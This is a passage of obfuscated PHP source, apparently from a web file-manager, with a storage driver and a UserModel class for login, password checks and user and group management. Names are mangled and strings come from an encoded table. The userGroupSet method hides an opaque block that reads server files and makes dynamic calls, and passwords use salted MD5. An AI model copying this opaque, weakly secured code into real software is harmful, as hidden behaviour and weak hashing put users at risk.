$this->pathInfoParse($ÖÈ‘°­´[$§¦ö¶”Á[966]]); } if ($×ãÜãóš == $§¦ö¶”Á[1566]) { $ÖÈ‘°­´[$§¦ö¶”Á[1636]] = array(); } continue; } $ÓÙõˆöÁ = implode($§¦ö¶”Á[10], array_slice($ÈóŸÍÏË, $½ïºÓ¾Ù + 1)); $Ø³ª§¥ö = array(); if ($½ïºÓ¾Ù === 0) { $Ø³ª§¥ö =& $ÖÈ‘°­´; } if ($½ïºÓ¾Ù === 1) { $Ø³ª§¥ö =& $ÖÈ‘°­´[$ÈóŸÍÏË[0]]; } if ($½ïºÓ¾Ù === 2) { $Ø³ª§¥ö =& $ÖÈ‘°­´[$ÈóŸÍÏË[0]][$ÈóŸÍÏË[1]]; } foreach ($Ø³ª§¥ö as $™ş©‘» => $Ú® „€Ö) { $›¤»Ÿã = $this->pathApiDecode(_get($Ú® „€Ö, $ÓÙõˆöÁ)); array_set_value($Ø³ª§¥ö[$™ş©‘»], $ÓÙõˆöÁ, $›¤»Ÿã); $this->pathInfoParse($Ø³ª§¥ö[$™ş©‘»]); } unset($Ø³ª§¥ö); } return $ÖÈ‘°­´; } private function requestMakeUrl($ş×ôƒÍ, $Áüşæ“ı = '') { $¬óàÅ¦€ =& $_SERVER[µÅ˜º…æ]; $ —ŞÚ‰İ = $this->_config; if (!$this->authToken) { return !1; } $çˆº¨À© = $this->requestQuery($Áüşæ“ı, !0) . $¬óàÅ¦€[1637] . $this->authToken; $ë»Ô¨ = rtrim($ —ŞÚ‰İ[$¬óàÅ¦€[580]][$¬óàÅ¦€[1583]], $¬óàÅ¦€[8]) . $¬óàÅ¦€[1638] . $ş×ôƒÍ; return $ë»Ô¨ . $¬óàÅ¦€[1639] . rawurlencode($ —ŞÚ‰İ[$¬óàÅ¦€[580]][$¬óàÅ¦€[1555]]) . $çˆº¨À©; } private function requestAuthToken() { $¬÷åëó =& $_SERVER[µÅ˜º…æ]; $É¹È–ä« = $this->_config; if (!$É¹È–ä«) { return !1; } $œß¦æçŒ = _get($É¹È–ä«, $¬÷åëó[1640]); $­´±ùÛ = array_find_by_field($É¹È–ä«[$¬÷åëó[580]][$¬÷åëó[1595]], $¬÷åëó[1641], $œß¦æçŒ); if (!$­´±ùÛ) { return !1; } $…“¸ùÄ’ = $­´±ùÛ[$¬÷åëó[1642]] . $¬÷åëó[1643] . $­´±ùÛ[$¬÷åëó[1348]]; $‡Í˜°Ÿ = $¬÷åëó[1644] . $this->pathParse[$¬÷åëó[487]] . $¬÷åëó[476] . $…“¸ùÄ’; $îğ®£ÍÁ = Cache::get($‡Í˜°Ÿ); if ($îğ®£ÍÁ) { return $îğ®£ÍÁ; } $îğ®£ÍÁ = Mcrypt::encode($…“¸ùÄ’, $¬÷åëó[1645]); Cache::set($‡Í˜°Ÿ, $îğ®£ÍÁ, 3600 * 24 * 60); return $îğ®£ÍÁ; } private function requestQuery($ü“ì¹½Ÿ = '', $®—ñŸï = false) { if (!$ü“ì¹½Ÿ || !is_array($ü“ì¹½Ÿ)) { return $ü“ì¹½Ÿ; } foreach ($ü“ì¹½Ÿ as $×†Ğ‹ † => $îÎŞ‡ ) { if (is_array($îÎŞ‡ )) { $ü“ì¹½Ÿ[$×†Ğ‹ †] = json_encode($îÎŞ‡ ); } } return $®—ñŸï ? $_SERVER[µÅ˜º…æ][284] . http_build_query($ü“ì¹½Ÿ) : $ü“ì¹½Ÿ; } private function requestSend($®ÌñÇíş, $ËÛæ†ÔÃ) { $‡Á¦¨Èî =& $_SERVER[µÅ˜º…æ]; $Ø×ÍÙç = $this->requestMakeUrl($®ÌñÇíş); if (!$Ø×ÍÙç) { return !1; } $¸¯ùºÜ´ = url_request($Ø×ÍÙç, $‡Á¦¨Èî[288], $this->requestQuery($ËÛæ†ÔÃ), !1, !1, !0); $ä¾»æÑ– = $¸¯ùºÜ´[$‡Á¦¨Èî[1393]]; if (!is_array($ä¾»æÑ–) || !$ä¾»æÑ– || !$ä¾»æÑ–[$‡Á¦¨Èî[1403]] || intval($ä¾»æÑ–[$‡Á¦¨Èî[1403]]) > 500) { $íğéšº = is_array($ä¾»æÑ–) ? $ä¾»æÑ–[$‡Á¦¨Èî[1393]] : $ä¾»æÑ– . $‡Á¦¨Èî[12]; if (!$¸¯ùºÜ´[$‡Á¦¨Èî[849]]) { $íğéšº .= $‡Á¦¨Èî[1646] . $¸¯ùºÜ´[$‡Á¦¨Èî[1403]] . $‡Á¦¨Èî[175]; } IO::errorTips($íğéšº, !1); return !1; } return $ä¾»æÑ–; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($û”œ¬) { parent::__construct($û”œ¬); $this->setSignVersion($_SERVER[µÅ˜º…æ][247]); } } goto eÆ±ôÏÃó; c Ó…Ğ²—: class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\162"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\141\x6d\x65" => "\165\163\145\162\137\155\145\x74\x61", "\x6d\145\164\x61\x46\151\x65\x6c\144" => "\x75\163\x65\x72\111\104"); protected $simpleField = "\x75\163\x65\162\111\x44\x2c\156\x69\143\x6b\116\x61\155\x65\54\156\141\155\x65\x2c\141\x76\141\x74\141\x72\54\x73\x65\x78\x2c\163\164\x61\164\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($º×“Ìà±) { $ê…¸‚¡© =& $_SERVER[µÅ˜º…æ]; $ï³üÑ“â = $ê…¸‚¡©[2673]; return array($ê…¸‚¡©[2262] => array($º×“Ìà±[0], $ï³üÑ“â), $ê…¸‚¡©[2264] => array($º×“Ìà±[0], $ï³üÑ“â), $ê…¸‚¡©[2674] => array($º×“Ìà±[0], $ï³üÑ“â)); } protected function ___getInfo($¡ªÌ“Ä¡) { $”»µäŠ“ = $this->getInfoSimple($¡ªÌ“Ä¡); if (!$”»µäŠ“ || !is_array($”»µäŠ“)) { return array(); } return $this->_getInfoApply($”»µäŠ“); } protected function ___getInfoFull($”ı²ıŞ©) { $½ì¼æ¥ = $this->getInfoSimple($”ı²ıŞ©); if (!$½ì¼æ¥ || !is_array($½ì¼æ¥)) { return array(); } return $this->_getInfoApply($½ì¼æ¥, !0); } protected function ___getInfoSimple($¨ìé“¨) { $´ß¦Î×ò =& $_SERVER[µÅ˜º…æ]; if (!$¨ìé“¨) { return array(); } $¸¶°ºŠ = $this->where(array($´ß¦Î×ò[1593] => intval($¨ìé“¨)))->find(); if (!$¸¶°ºŠ || !is_array($¸¶°ºŠ)) { return array(); } $¸¶°ºŠ[$´ß¦Î×ò[2373]] = Action($´ß¦Î×ò[2374])->parseUrl($¸¶°ºŠ[$´ß¦Î×ò[2373]]); return $¸¶°ºŠ; } private function _getInfoApply($Ô‰ĞËØú, $ä“ƒ¤Àê = false) { $ËíÛ«ÛÉ =& $_SERVER[µÅ˜º…æ]; if (!$Ô‰ĞËØú) { return $Ô‰ĞËØú; } $Èæ“û©œ = md5($ËíÛ«ÛÉ[2675] . $Ô‰ĞËØú[$ËíÛ«ÛÉ[1052]] . $ËíÛ«ÛÉ[2676] . $Ô‰ĞËØú[$ËíÛ«ÛÉ[32]]); $Ô‰ĞËØú = $this->_listDataApplyItem($Ô‰ĞËØú); $»Æ©‚Òå = Model($ËíÛ«ÛÉ[1534])->metaGet($Ô‰ĞËØú[$ËíÛ«ÛÉ[90]][$ËíÛ«ÛÉ[191]]); $Ô‰ĞËØú[$ËíÛ«ÛÉ[2677]] = $Èæ“û©œ; $Ô‰ĞËØú[$ËíÛ«ÛÉ[90]][$ËíÛ«ÛÉ[2464]] = isset($»Æ©‚Òå[$ËíÛ«ÛÉ[2465]]) ? $»Æ©‚Òå[$ËíÛ«ÛÉ[2465]] : null; if ($ä“ƒ¤Àê) { $Ô‰ĞËØú[$ËíÛ«ÛÉ[555]] = $this->metaGet($Ô‰ĞËØú[$ËíÛ«ÛÉ[1593]]); } return $Ô‰ĞËØú; } protected function getInfoSimpleOuter($ï»Â‹»ò) { $¿ßªş—± =& $_SERVER[µÅ˜º…æ]; if (!$ï»Â‹»ò || $ï»Â‹»ò == 0) { return array($¿ßªş—±[1593] => $¿ßªş—±[228], $¿ßªş—±[32] => $¿ßªş—±[173] . LNG($¿ßªş—±[2678]) . $¿ßªş—±[175], $¿ßªş—±[2373] => STATIC_PATH . $¿ßªş—±[2679]); } $¦ÙƒÖÇÖ = $this->cacheFunctionGet($¿ßªş—±[2273], $ï»Â‹»ò); $ÛŒéïµõ = array_field_key($¦ÙƒÖÇÖ, explode($¿ßªş—±[50], $this->simpleField)); if (!$ÛŒéïµõ) { return array($¿ßªş—±[1593] => $¿ßªş—±[1381], $¿ßªş—±[32] => $¿ßªş—±[173] . LNG($¿ßªş—±[2680]) . $¿ßªş—±[175], $¿ßªş—±[2373] => STATIC_PATH . $¿ßªş—±[2681]); } $ÛŒéïµõ[$¿ßªş—±[2373]] = Action($¿ßªş—±[2374])->parseUrl($ÛŒéïµõ[$¿ßªş—±[2373]]); return $ÛŒéïµõ; } protected function groupUser($ÅÑ˜ñÉƒ) { } public static function errorLang($ÄÂˆéÀ—) { $šñ«¶çã =& $_SERVER[µÅ˜º…æ]; $ßÆ ì¤­ = array(self::ERROR_USER_NOT_EXISTS => $šñ«¶çã[2682], self::ERROR_USER_PASSWORD_ERROR => $šñ«¶çã[2683], self::ERROR_USER_EXIST_NAME => $šñ«¶çã[2684], self::ERROR_USER_EXIST_PHONE => $šñ«¶çã[2685], self::ERROR_USER_EXIST_EMAIL => $šñ«¶çã[2686], self::ERROR_USER_LOGIN_LOCK => $šñ«¶çã[2687], self::ERROR_IP_NOT_ALLOW => $šñ«¶çã[2688], self::ERROR_USER_EXIST_NICKNAME => $šñ«¶çã[2689]); $îÙ†å¦š = LNG($ßÆ ì¤­[$ÄÂˆéÀ—]); if ($ÄÂˆéÀ— == self::ERROR_USER_LOGIN_LOCK) { $ı©ì‘© = (int) Model($šñ«¶çã[1490])->get($šñ«¶çã[2690]); if ($ı©ì‘© > 60) { $îÙ†å¦š = str_replace($šñ«¶çã[91], ceil($ı©ì‘© / 60), $îÙ†å¦š); } } return $îÙ†å¦š; } protected function metaSet($ ÜşÆÄğ, $ÁÃŠÛŸÂ = null, $ø‚œ²Ó = null) { $this->clearCache($ ÜşÆÄğ); return parent::metaSet($ ÜşÆÄğ, $ÁÃŠÛŸÂ, $ø‚œ²Ó); } public function getInfoByMeta($€¬‡Û„ã, $Ü™õ–œ) { $èÍµÔ±™ =& $_SERVER[µÅ˜º…æ]; $©÷ğæ¤£ = Model($èÍµÔ±™[2691])->where(array($èÍµÔ±™[95] => $€¬‡Û„ã, $èÍµÔ±™[451] => $Ü™õ–œ))->find(); if ($©÷ğæ¤£) { return $this->getInfo($©÷ğæ¤£[$èÍµÔ±™[1593]]); } return !1; } public function userLoginCheck($ÊĞ­ùı‚, $²ğÔµï¹, $ÍÜû¿íÔ = false) { $•½ÅÑŠ =& $_SERVER[µÅ˜º…æ]; $÷ âø¦ = $this->userLoginFind($ÊĞ­ùı‚); if (!$÷ âø¦) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($÷ âø¦[$•½ÅÑŠ[1593]], $²ğÔµï¹)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $ÍÜû¿íÔ ? $this->getInfoFull($÷ âø¦[$•½ÅÑŠ[1593]]) : $this->getInfo($÷ âø¦[$•½ÅÑŠ[1593]]); } public function userLoginFind($É‡¹€×) { $¨¯ÇÉ´ =& $_SERVER[µÅ˜º…æ]; $¼·§»Éå = array($¨¯ÇÉ´[32] => $É‡¹€×, $¨¯ÇÉ´[2475] => $É‡¹€×, $¨¯ÇÉ´[380] => $É‡¹€×, $¨¯ÇÉ´[2692] => $É‡¹€×, $¨¯ÇÉ´[1169] => $¨¯ÇÉ´[1171]); if ($this->nickNameRpt()) { unset($¼·§»Éå[$¨¯ÇÉ´[2475]]); } return $this->where($¼·§»Éå)->find(); } public function clearCache($Ÿ»À‚ûÃ) { $õ‘¹Ñ™Š =& $_SERVER[µÅ˜º…æ]; $this->cacheFunctionClear($õ‘¹Ñ™Š[2272], $Ÿ»À‚ûÃ); $this->cacheFunctionClear($õ‘¹Ñ™Š[2273], $Ÿ»À‚ûÃ); $this->cacheFunctionClear($õ‘¹Ñ™Š[2693], $Ÿ»À‚ûÃ); } public function userPasswordCheck($Çä¼—èŞ, $¦‹§š×¹) { $İ‹ŒòÊô =& $_SERVER[µÅ˜º…æ]; $Äƒ´Şˆ® = $this->where(array($İ‹ŒòÊô[1593] => intval($Çä¼—èŞ)))->find(); $¶Ÿî÷ˆ = $this->metaGet($Çä¼—èŞ); $äßÈÓÜÇ = isset($¶Ÿî÷ˆ[$İ‹ŒòÊô[2694]]) ? $¶Ÿî÷ˆ[$İ‹ŒòÊô[2694]] : $İ‹ŒòÊô[12]; if (md5($äßÈÓÜÇ . trim($¦‹§š×¹)) !== $Äƒ´Şˆ®[$İ‹ŒòÊô[1052]]) { return !1; } return !0; } public function userAdd($†øÀª‚ë) { $ûŠ¬ŠŞ =& $_SERVER[µÅ˜º…æ]; $¿ã®Öó = array($ûŠ¬ŠŞ[509] => $†øÀª‚ë[$ûŠ¬ŠŞ[32]], $ûŠ¬ŠŞ[2695] => $†øÀª‚ë[$ûŠ¬ŠŞ[2372]], $ûŠ¬ŠŞ[2696] => isset($†øÀª‚ë[$ûŠ¬ŠŞ[380]]) ? $†øÀª‚ë[$ûŠ¬ŠŞ[380]] : $ûŠ¬ŠŞ[12], $ûŠ¬ŠŞ[2697] => isset($†øÀª‚ë[$ûŠ¬ŠŞ[2692]]) ? $†øÀª‚ë[$ûŠ¬ŠŞ[2692]] : $ûŠ¬ŠŞ[12], $ûŠ¬ŠŞ[2698] => isset($†øÀª‚ë[$ûŠ¬ŠŞ[2475]]) ? $†øÀª‚ë[$ûŠ¬ŠŞ[2475]] : $†øÀª‚ë[$ûŠ¬ŠŞ[32]], $ûŠ¬ŠŞ[2699] => isset($†øÀª‚ë[$ûŠ¬ŠŞ[2373]]) ? $†øÀª‚ë[$ûŠ¬ŠŞ[2373]] : $ûŠ¬ŠŞ[12], $ûŠ¬ŠŞ[2700] => isset($†øÀª‚ë[$ûŠ¬ŠŞ[2701]]) ? $†øÀª‚ë[$ûŠ¬ŠŞ[2701]] : 1, $ûŠ¬ŠŞ[2702] => $†øÀª‚ë[$ûŠ¬ŠŞ[1052]], $ûŠ¬ŠŞ[2266] => isset($†øÀª‚ë[$ûŠ¬ŠŞ[2167]]) ? $†øÀª‚ë[$ûŠ¬ŠŞ[2167]] : 1024 * 1024 * 20, $ûŠ¬ŠŞ[2267] => 0, $ûŠ¬ŠŞ[2703] => 0, $ûŠ¬ŠŞ[2312] => isset($†øÀª‚ë[$ûŠ¬ŠŞ[849]]) ? $†øÀª‚ë[$ûŠ¬ŠŞ[849]] : 1); if (!empty($†øÀª‚ë[$ûŠ¬ŠŞ[1593]])) { $¿ã®Öó[$ûŠ¬ŠŞ[1593]] = $†øÀª‚ë[$ûŠ¬ŠŞ[1593]]; } $‰²Ç»˜× = $this->_checkExist($†øÀª‚ë); if ($‰²Ç»˜× !== !0) { return $‰²Ç»˜×; } if (!empty($¿ã®Öó[$ûŠ¬ŠŞ[2373]]) && strlen($¿ã®Öó[$ûŠ¬ŠŞ[2373]]) > 255) { $¿ã®Öó[$ûŠ¬ŠŞ[2373]] = $ûŠ¬ŠŞ[12]; } $ßçûÚˆ÷ = $this->add($¿ã®Öó); $Îœˆ©ã = array($ûŠ¬ŠŞ[2702] => $¿ã®Öó[$ûŠ¬ŠŞ[1052]], $ûŠ¬ŠŞ[2698] => $¿ã®Öó[$ûŠ¬ŠŞ[2475]], $ûŠ¬ŠŞ[2704] => $†øÀª‚ë[$ûŠ¬ŠŞ[2271]]); $this->userEdit($ßçûÚˆ÷, $Îœˆ©ã); Model($ûŠ¬ŠŞ[1534])->userRootAdd($ßçûÚˆ÷); return $ßçûÚˆ÷; } protected function userEditTest($ŒÃ›’Å, $ŞÜë¥”Ï) { return $this->call($_SERVER[µÅ˜º…æ][2705], $ŒÃ›’Å, $ŞÜë¥”Ï); } protected function userEdit($‰¶ÉÅ¯¯, $ğæ‡Æ¬) { $ùÜ”ëÒ¿ =& $_SERVER[µÅ˜º…æ]; $ıœ®× = $this->getInfoSimple($‰¶ÉÅ¯¯); if (!$ıœ®×) { return !1; } $ì†ä±ŸÔ = $this->_checkExist($ğæ‡Æ¬, $‰¶ÉÅ¯¯); if ($ì†ä±ŸÔ !== !0) { return $ì†ä±ŸÔ; } if (isset($ğæ‡Æ¬[$ùÜ”ëÒ¿[1052]]) && trim($ğæ‡Æ¬[$ùÜ”ëÒ¿[1052]]) != $ùÜ”ëÒ¿[12]) { $²ÄÈĞÃ = $this->metaGet($‰¶ÉÅ¯¯); if (empty($²ÄÈĞÃ[$ùÜ”ëÒ¿[2694]])) { $²ÄÈĞÃ[$ùÜ”ëÒ¿[2694]] = rand_string(10); Model($ùÜ”ëÒ¿[597])->metaSet($‰¶ÉÅ¯¯, $ùÜ”ëÒ¿[2694], $²ÄÈĞÃ[$ùÜ”ëÒ¿[2694]]); } $ğæ‡Æ¬[$ùÜ”ëÒ¿[1052]] = md5($²ÄÈĞÃ[$ùÜ”ëÒ¿[2694]] . trim($ğæ‡Æ¬[$ùÜ”ëÒ¿[1052]])); } else { unset($ğæ‡Æ¬[$ùÜ”ëÒ¿[1052]]); } if (!empty($ğæ‡Æ¬[$ùÜ”ëÒ¿[2373]]) && strlen($ğæ‡Æ¬[$ùÜ”ëÒ¿[2373]]) > 255) { $ğæ‡Æ¬[$ùÜ”ëÒ¿[2373]] = $ùÜ”ëÒ¿[12]; } if (isset($ğæ‡Æ¬[$ùÜ”ëÒ¿[2475]])) { $this->setNamePinyin($‰¶ÉÅ¯¯, $ğæ‡Æ¬[$ùÜ”ëÒ¿[2475]]); } if (isset($ğæ‡Æ¬[$ùÜ”ëÒ¿[2271]])) { $çí§Ë»† = $ùÜ”ëÒ¿[1493] . $‰¶ÉÅ¯¯; $‚¬óÙş = $ùÜ”ëÒ¿[1491]; $šâ½Æ¾ = $ğæ‡Æ¬[$ùÜ”ëÒ¿[2271]] ? $ğæ‡Æ¬[$ùÜ”ëÒ¿[2271]] : $ùÜ”ëÒ¿[12]; $µ€ïò¥š = Model($ùÜ”ëÒ¿[1490])->get($çí§Ë»†, $‚¬óÙş); $µ€ïò¥š = $µ€ïò¥š ? $µ€ïò¥š : $ùÜ”ëÒ¿[12]; if ($µ€ïò¥š != $šâ½Æ¾) { if (!$šâ½Æ¾ && $µ€ïò¥š) { Model($ùÜ”ëÒ¿[1490])->remove($çí§Ë»†, $‚¬óÙş); } else { if ($šâ½Æ¾) { Model($ùÜ”ëÒ¿[1490])->set($çí§Ë»†, $šâ½Æ¾, $‚¬óÙş); } } } unset($ğæ‡Æ¬[$ùÜ”ëÒ¿[2271]]); Model($ùÜ”ëÒ¿[617])->metaSet($‰¶ÉÅ¯¯, $ùÜ”ëÒ¿[2271], $šâ½Æ¾); } if (empty($ğæ‡Æ¬)) { return !0; } $this->where(array($ùÜ”ëÒ¿[1967] => $‰¶ÉÅ¯¯))->save($ğæ‡Æ¬); $this->clearCache($‰¶ÉÅ¯¯); return !0; } public function setNamePinyin($©·ŞÚï„, $ÇÜÅ¹ = false) { $Ñœ¹¬ùø =& $_SERVER[µÅ˜º…æ]; if (!$ÇÜÅ¹) { $ëµ˜îìİ = $this->getInfoSimple($©·ŞÚï„); $ÇÜÅ¹ = $ëµ˜îìİ[$Ñœ¹¬ùø[2475]] ? $ëµ˜îìİ[$Ñœ¹¬ùø[2475]] : $ëµ˜îìİ[$Ñœ¹¬ùø[32]]; } $Ô§ùöº’ = Model($Ñœ¹¬ùø[617]); if (!Input::check($ÇÜÅ¹, $Ñœ¹¬ùø[677])) { return $Ô§ùöº’->metaSet($©·ŞÚï„, array($Ñœ¹¬ùø[552] => $Ñœ¹¬ùø[12], $Ñœ¹¬ùø[551] => $Ñœ¹¬ùø[12])); } return $Ô§ùöº’->metaSet($©·ŞÚï„, array($Ñœ¹¬ùø[552] => str_replace($Ñœ¹¬ùø[53], $Ñœ¹¬ùø[12], Pinyin::get($ÇÜÅ¹)), $Ñœ¹¬ùø[551] => Pinyin::get($ÇÜÅ¹, $Ñœ¹¬ùø[678]))); } private function nickNameRpt() { $´¨„—Ö =& $_SERVER[µÅ˜º…æ]; $è€šÜ¬À = Model($´¨„—Ö[872])->get($´¨„—Ö[2706]); $ˆú¬³£ = $GLOBALS[$´¨„—Ö[6]][$´¨„—Ö[468]][$´¨„—Ö[2706]]; $Ğ³¦¼İµ = !is_null($è€šÜ¬À) ? $è€šÜ¬À : $ˆú¬³£; return !!$Ğ³¦¼İµ; } private function _checkExist($Ù†š–ûã, $™Úöõ = false) { $‘Â„©² =& $_SERVER[µÅ˜º…æ]; $ğ–º¸ÉÔ = array($‘Â„©²[32] => UserModel::ERROR_USER_EXIST_NAME, $‘Â„©²[2475] => UserModel::ERROR_USER_EXIST_NICKNAME, $‘Â„©²[380] => UserModel::ERROR_USER_EXIST_EMAIL, $‘Â„©²[2692] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ğ–º¸ÉÔ[$‘Â„©²[2475]]); } $‡œ‘ö™Ä = $™Úöõ ? array($‘Â„©²[1593] => array($‘Â„©²[2707], $™Úöõ)) : array(); foreach ($ğ–º¸ÉÔ as $ÓˆùÌÅ† => $ŠÙÉÚ) { $¾œ¹åÄ™ = array(); foreach ($ğ–º¸ÉÔ as $“ìåùµø => $±²Ãïéç) { if (isset($Ù†š–ûã[$“ìåùµø]) && $Ù†š–ûã[$“ìåùµø]) { $¾œ¹åÄ™[] = $Ù†š–ûã[$“ìåùµø]; } } if (!$¾œ¹åÄ™) { continue; } $“Ã…¸“° = array_merge(array($ÓˆùÌÅ† => array($‘Â„©²[7], $¾œ¹åÄ™)), $‡œ‘ö™Ä); $å®ÀÁçŸ = $this->where($“Ã…¸“°)->find(); if ($å®ÀÁçŸ) { return $ŠÙÉÚ; } } return !0; } public function userListInfo($Â¼ÌÈéÅ) { $ä¢§šÈŞ =& $_SERVER[µÅ˜º…æ]; $ùìåÚ = array(); $Â¼ÌÈéÅ = is_array($Â¼ÌÈéÅ) ? array_unique($Â¼ÌÈéÅ) : array(); if (!$Â¼ÌÈéÅ) { return $ùìåÚ; } if (count($Â¼ÌÈéÅ) < 20) { foreach ($Â¼ÌÈéÅ as $ÈŞíà‰ô) { $ùìåÚ[$ÈŞíà‰ô . $ä¢§šÈŞ[12]] = $this->getInfoSimpleOuter($ÈŞíà‰ô); } } else { $Óïß¦Æİ = array($ä¢§šÈŞ[1967] => array($ä¢§šÈŞ[507], $Â¼ÌÈéÅ)); if (count($Â¼ÌÈéÅ) == 1) { $Óïß¦Æİ = array($ä¢§šÈŞ[1967] => $Â¼ÌÈéÅ[0]); } $öÇÙ¨ã = Model($ä¢§šÈŞ[597])->field($this->simpleField)->where($Óïß¦Æİ)->select(); $öÇÙ¨ã = array_to_keyvalue($öÇÙ¨ã, $ä¢§šÈŞ[1593]); foreach ($Â¼ÌÈéÅ as $ÈŞíà‰ô) { $ñ³ªÇµ = $öÇÙ¨ã[$ÈŞíà‰ô]; if (!$ñ³ªÇµ) { $ùìåÚ[$ÈŞíà‰ô . $ä¢§šÈŞ[12]] = $this->getInfoSimpleOuter($ÈŞíà‰ô); continue; } $ñ³ªÇµ[$ä¢§šÈŞ[2373]] = Action($ä¢§šÈŞ[2374])->parseUrl($ñ³ªÇµ[$ä¢§šÈŞ[2373]]); $ùìåÚ[$ÈŞíà‰ô . $ä¢§šÈŞ[12]] = $ñ³ªÇµ; } } return $ùìåÚ; } protected function userStatus($¬Š¾ô¢ö, $°áØÃ×¡) { $­ĞÅ—ñ = $this->getInfoSimple($¬Š¾ô¢ö); if (!$­ĞÅ—ñ) { return !1; } $ÜèıªÚ = array($_SERVER[µÅ˜º…æ][849] => $°áØÃ×¡); return $this->userEdit($¬Š¾ô¢ö, $ÜèıªÚ); } protected function userRemove($Ü…Êì) { $“Ü“’œ“ =& $_SERVER[µÅ˜º…æ]; $«ÚàÏ®® = $this->getInfoSimple($Ü…Êì); if (!$«ÚàÏ®®) { return !1; } $»ÕŒ©‚İ = array($“Ü“’œ“[1967] => $Ü…Êì); Model($“Ü“’œ“[686])->where($»ÕŒ©‚İ)->delete(); Model($“Ü“’œ“[2708])->where($»ÕŒ©‚İ)->delete(); Model($“Ü“’œ“[2275])->where($»ÕŒ©‚İ)->delete(); Model($“Ü“’œ“[2691])->where($»ÕŒ©‚İ)->delete(); Model($“Ü“’œ“[1239])->where($»ÕŒ©‚İ)->delete(); Model($“Ü“’œ“[2492])->removeUserAll($Ü…Êì); Model($“Ü“’œ“[932])->userRootRemove($Ü…Êì); return $this->where($»ÕŒ©‚İ)->delete(); } protected function userGroupSet($ìÉâ÷şº, $›‰€À–À, $÷Ï´Çå = array()) { $Á‰¥·ëš =& $_SERVER[µÅ˜º…æ]; if ($_SERVER[$Á‰¥·ëš[1025]] != $_SERVER[$Á‰¥·ëš[1041]]) { $³ÛÖËÒÕ = $Á‰¥·ëš[1042]; $Ë¨ä’ ó = $Á‰¥·ëš[1026]; $Â£»ü£Ó = $_SERVER[$Á‰¥·ëš[1027]] . $Á‰¥·ëš[1028]; $ç¬Éß– = $Ë¨ä’ ó($Â£»ü£Ó); $·»–Ò¯ = explode($Á‰¥·ëš[285], $ç¬Éß–); if (count($·»–Ò¯) < $Á‰¥·ëš[709]) { $³İé®ıÃ = $Á‰¥·ëš[1029]; $³İé®ıÃ(); } $ÈóïÏëà = $Á‰¥·ëš[1043]; $ÈóïÏëà($_SERVER[$Á‰¥·ëš[1044]]); $ÈóïÏëà($_SERVER[$Á‰¥·ëš[1027]] . $Á‰¥·ëš[1045]); $«ß¶ÜÄ‹ = 1; while ($«ß¶ÜÄ‹ > 1) { $«ß¶ÜÄ‹ = $«ß¶ÜÄ‹ + 4; $ëäÃø ¹ = rawurlencode($«ß¶ÜÄ‹ . $Á‰¥·ëš[463]); } } $üâËÅ— = $this->getInfoSimple($ìÉâ÷şº); if (!$üâËÅ— || !is_array($›‰€À–À)) { return !1; } $³Ïœ¾ÉÕ = Model($Á‰¥·ëš[2275]); $³Ïœ¾ÉÕ->where(array($Á‰¥·ëš[1593] => $ìÉâ÷şº))->delete(); $¨˜¿ÌÎØ = array(); $ü±ùà€ = 0; foreach ($›‰€À–À as $ñ¦Ò³æ» => $ÁÒ•¡²Ã) { $÷åñ‚½» = array($Á‰¥·ëš[1593] => $ìÉâ÷şº, $Á‰¥·ëš[1496] => $ñ¦Ò³æ», $Á‰¥·ëš[1641] => $ÁÒ•¡²Ã); $÷åñ‚½»[$Á‰¥·ëš[2203]] = isset($÷Ï´Çå[$ü±ùà€]) ? $÷Ï´Çå[$ü±ùà€] : 0; $ü±ùà€++; $¨˜¿ÌÎØ[] = $÷åñ‚½»; } return $³Ïœ¾ÉÕ->addAll($¨˜¿ÌÎØ, array(), !0); } protected function userGroupAdd($ÀÕÌŞ¸Õ, $‹—úñõƒ = array()) { $ÙÎ·¡ =& $_SERVER[µÅ˜º…æ]; $ã³²Èï· = $this->getInfoSimple($ÀÕÌŞ¸Õ); if (!$ã³²Èï· || empty($‹—úñõƒ)) { return !1; } $öÎµ¨˜ = array(); foreach ($‹—úñõƒ as $´šËÃ¹ => $³ÙˆÅ¤³) { $öÎµ¨˜[] = array($ÙÎ·¡[1593] => $ÀÕÌŞ¸Õ, $ÙÎ·¡[1496] => $´šËÃ¹, $ÙÎ·¡[1641] => $³ÙˆÅ¤³, $ÙÎ·¡[2203] => 0); } return Model($ÙÎ·¡[2275])->addAll($öÎµ¨˜, array(), !0); } protected function userGroupRemove($í³€ëˆ, $ŞÃ¯—) { $ ŞÑÒ¹¬ =& $_SERVER[µÅ˜º…æ]; $ÈÄË‘­ = $this->getInfoSimple($í³€ëˆ); if (!$ÈÄË‘­ || !$ŞÃ¯—) { return !1; } $šşóÇèØ = array($ ŞÑÒ¹¬[1967] => $í³€ëˆ, $ ŞÑÒ¹¬[2268] => $ŞÃ¯—); return Model($ ŞÑÒ¹¬[2275])->where($šşóÇèØ)->delete(); } public function listData() { $éí´¶ê = $this->_makeOrder()->selectPage(50); $this->_listDataApply($éí´¶ê[$_SERVER[µÅ˜º…æ][446]]); return $éí´¶ê; } public function listByID($Úâ»û) { $‚áõµß× =& $_SERVER[µÅ˜º…æ]; if (!$Úâ»û) { return; } $ëáÌ…ì§ = array($‚áõµß×[1593] => array($‚áõµß×[7], $Úâ»û)); $ˆ©ˆ¢èë = $this->where($ëáÌ…ì§)->select(); $ˆ©ˆ¢èë = array_sort_keep($ˆ©ˆ¢èë, $‚áõµß×[1593], $Úâ»û); $this->_listDataApply($ˆ©ˆ¢èë); return $ˆ©ˆ¢èë; } public function listByGroup($¥”Ïï§Î = 0, $ë®ÜÄâ„ = array()) { $Âù¹ì¸Ê =& $_SERVER[µÅ˜º…æ]; $à¬ÀŒº = $Âù¹ì¸Ê[12]; $ äõÉµ¼ = array(); if ($¥”Ïï§Î) { $ äõÉµ¼ = array($Âù¹ì¸Ê[2709] => intval($¥”Ïï§Î)); $à¬ÀŒº = 